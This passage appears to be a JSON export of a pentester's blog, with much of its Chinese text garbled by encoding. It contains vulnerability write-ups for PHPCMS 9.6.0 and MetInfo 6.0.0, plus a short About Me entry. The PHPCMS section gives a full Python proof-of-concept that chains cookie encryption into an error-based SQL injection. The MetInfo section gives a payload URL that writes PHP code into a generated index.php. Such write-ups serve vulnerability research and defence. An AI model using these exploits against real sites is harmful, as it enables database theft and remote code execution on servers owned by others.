/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/attachment/attachments.php 123456789101112131415public function swfupload_json() &#123; $arr['aid'] = intval($_GET['aid']); $arr['src'] = safe_replace(trim($_GET['src'])); $arr['filename'] = urlencode(safe_replace($_GET['filename'])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie('att_json'); $att_arr_exist_tmp = explode('||', $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; return true; &#125; else &#123; $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str; param::set_cookie('att_json',$json_str); return true; &#125; &#125; å…ˆç»è¿‡safe_replace å‡½æ•°ï¼Œè¿‡æ»¤ä¸€éï¼Œç„¶åå­˜å…¥æ•°ç»„ï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶è¿›å…¥ set_cookieå‡½æ•°12345678910111213public static function set_cookie($var, $value = '', $time = 0) &#123; $time = $time &gt; 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0); $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0; $var = pc_base::load_config('system','cookie_pre').$var; $_COOKIE[$var] = $value; if (is_array($value)) &#123; foreach($value as $k=&gt;$v) &#123; setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; else &#123; setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; å¯ä»¥çœ‹åˆ°ï¼Œå¯¹ä¼ å…¥çš„value è¿›è¡Œä¸€æ¬¡sys_auth ç„¶åsetcookieï¼Œå¯ä»¥åœ¨è¿”å›åŒ…ä¸­æ‹¿åˆ°å›æ˜¾ æœ€åè¿˜éœ€è¦å­˜åœ¨ä¸€ä¸ªcookieï¼Œè®©æˆ‘ä»¬ä¸è¢«è·³è½¬åˆ°mainç•Œé¢/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/wap/index.php1234function __construct() &#123; $this-&gt;db = pc_base::load_model('content_model'); $this-&gt;siteid = isset($_GET['siteid']) &amp;&amp; (intval($_GET['siteid']) &gt; 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1); param::set_cookie('siteid',$this-&gt;siteid); é€šè¿‡GETæ–¹æ³•å¾—åˆ°$siteidï¼Œç„¶åä¼ åˆ°äº†set_cookie()å‡½æ•°ä¸­ï¼Œæ»¡è¶³æ¡ä»¶ã€‚ æ”»å‡»é“¾ï¼š è®¿é—® /index.php?m=wap&amp;a=index&amp;siteid=1 ã€‚è·å–å“åº”å¤´çš„set-Cookieå­—æ®µã€‚ å°†å‰ä¸€æ­¥è·å–åˆ°çš„å­—æ®µèµ‹å€¼ç»™userid_flashï¼Œä½œä¸ºPOSTå‚æ•°ã€‚è®¿é—® /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=ã€payloadã€‘ è·å–è¿”å›å¤´çš„setâ€”Cookieå­—æ®µï¼Œæ­¤å³ä¸ºåŠ å¯†åçš„payload è®¿é—® /index.php?m=content&amp;c=down&amp;a_k=ã€åŠ å¯†åçš„payloadã€‘ï¼Œæ³¨å…¥æˆåŠŸã€‚ 0x02 Poc1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-# @Time : 2018-12-20 23:24# @Author : Patrilic# @FileName: sql_poc.py# @Software: PyCharmimport requestsimport reimport sysdef poc(url): try: step1 = url + \"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1\" response = requests.get(step1) post = &#123; \"userid_flash\":response.cookies[\"okuga_siteid\"] &#125; print(\"[+] Get Cookie : \" + response.cookies[\"okuga_siteid\"]) # è·å–cookieï¼Œé¿å…ç™»é™†å¤±æ•ˆ step2 = url + \"//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26\" response = requests.post(step2, post) # print(response.cookies) sqli_payload = response.cookies['okuga_att_json'] print(\"[+] Get Sqli_poc : \" + sqli_payload) # è·å–åŠ å¯† payload step3 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload response = requests.get(step3) # print(response.text) user = re.findall(r'&lt;/b&gt;XPATH syntax error:(.*?)&lt;br /&gt;', response.text) # æ³¨å…¥ try: user[0] print(\"[+] Congraduations! This url is Vulnerable! \") except: print(\"[-] Not vulnerable!\") except: passdef main(): url = sys.argv[1] poc(url)if __name__ == '__main__': main()","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://patrilic.top/tags/ä»£ç å®¡è®¡/"}]},{"title":"Metinfo 6.0.0 ä»»æ„ä»£ç å†™å…¥å¯¼è‡´getshell","slug":"Metinfo 6.0.0 ä»»æ„ä»£ç å†™å…¥","date":"2019-04-03T02:58:32.000Z","updated":"2019-08-20T15:29:36.214Z","comments":true,"path":"2019/04/03/Metinfo 6.0.0 ä»»æ„ä»£ç å†™å…¥/","link":"","permalink":"http://patrilic.top/2019/04/03/Metinfo 6.0.0 ä»»æ„ä»£ç å†™å…¥/","excerpt":"","text":"0x01 æ¼æ´åˆ†ææ¼æ´å…³é”®ç‚¹ä½äº/Applications/MxSrvs/www/MetInfo6.0.0/admin/include/global.func.phpä¸­çº¦878è¡Œçš„Copyindxå‡½æ•°12345678function Copyindx($newindx,$type)&#123; if(!file_exists($newindx))&#123; $oldcont =\"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; $typeå¯æ§ï¼Œå¹¶ä¸”ç›´æ¥å¸¦å…¥åˆ°phpä»£ç ä¸­ï¼Œå‰ææ˜¯ä¸å­˜åœ¨ $newindx å˜é‡ï¼Œå¾€ä¸Šè·Ÿå‡½æ•° ä½äº/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/global.func.phpçš„124è¡Œè°ƒç”¨è¯¥å‡½æ•°1Copyindx(ROOTPATH.$foldername.'/index.php',$module); è§„å®š $newindx ä¸ºç›®å½•å + /index.php, ç„¶å $module è¯¥æ–‡ä»¶ å†å¾€ä¸Šè·Ÿï¼Œæ‰¾åˆ°/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/save.php 12345678910111213if($if_in==0)&#123; if($filename!='' &amp;&amp; $filename!=$filenameold)&#123; $filenameok = $db-&gt;get_one(\"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'\"); if($filenameok)metsave('-1',$lang_modFilenameok); if(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123; $filenameok1 = $db-&gt;get_one(\"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'\"); if($filenameok1)metsave('-1',$lang_jsx30); &#125; &#125; $filedir=\"../../\".$foldername; if(!file_exists($filedir))@mkdir($filedir,0777); if(!file_exists($filedir))metsave('-1',$lang_modFiledir); column_copyconfig($foldername,$module,$id); æ»¡è¶³è¯¥æ¡ä»¶å³å¯è°ƒç”¨colnmn_copyconfig()å‡½æ•° æ”»å‡»æµç¨‹ ç™»é™†åå° æ„é€ payloadï¼šadmin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;phpinfo();/* è®¿é—®/upload/index.php æ³¨æ„ï¼š foldernameå¯æ§ï¼Œå¦‚æœuploadç›®å½•ä¸‹å­˜åœ¨index.phpï¼Œä¸ä¼šé‡å¤å†™å…¥ï¼Œæ›´æ¢ç›®å½•å³å¯ /* å¿…é¡»è¦æ±‚ï¼Œä¼šæ³¨é‡Šæ‰åé¢çš„require_once â€˜../include/module.phpâ€™; é˜²æ­¢è·³è½¬åˆ°404é¡µé¢ 0x02 æ¼æ´å¤ç°","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://patrilic.top/tags/ä»£ç å®¡è®¡/"}]},{"title":"About Me","slug":"Hello","date":"2019-04-01T03:20:33.000Z","updated":"2019-09-09T15:34:45.129Z","comments":true,"path":"2019/04/01/Hello/","link":"","permalink":"http://patrilic.top/2019/04/01/Hello/","excerpt":"","text":"Welcome To My Blogâ¤ï¸æ„¿ä¸–ç•Œç¾å¥½ï¼Œæˆ‘ä»ç„¶æ˜¯æˆ‘ tags CUIT-D0g3 Pentest &amp;&amp; Red Team \bLove 70&#39;s music Contact Email: patrilic@outlook.com Github: https://github.com/patrilic ä¸–ï¼ˆã‚ˆï¼‰ã®ä¸­ï¼ˆãªã‹ï¼‰ã«å¤±æ•—ï¼ˆã—ã£ã±ã„ï¼‰ã¨ã„ã†ã‚‚ã®ã¯ãªã„ã€‚ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã—ã¦ã„ã‚‹ã†ã¡ã¯å¤±æ•—ã¯ãªã„ã€‚ã‚ãã‚‰ã‚ãŸæ™‚ï¼ˆã¨ãï¼‰ãŒå¤±æ•—ã§ã‚ã‚‹ã€‚","categories":[{"name":"Diary","slug":"Diary","permalink":"http://patrilic.top/categories/Diary/"}],"tags":[]}]}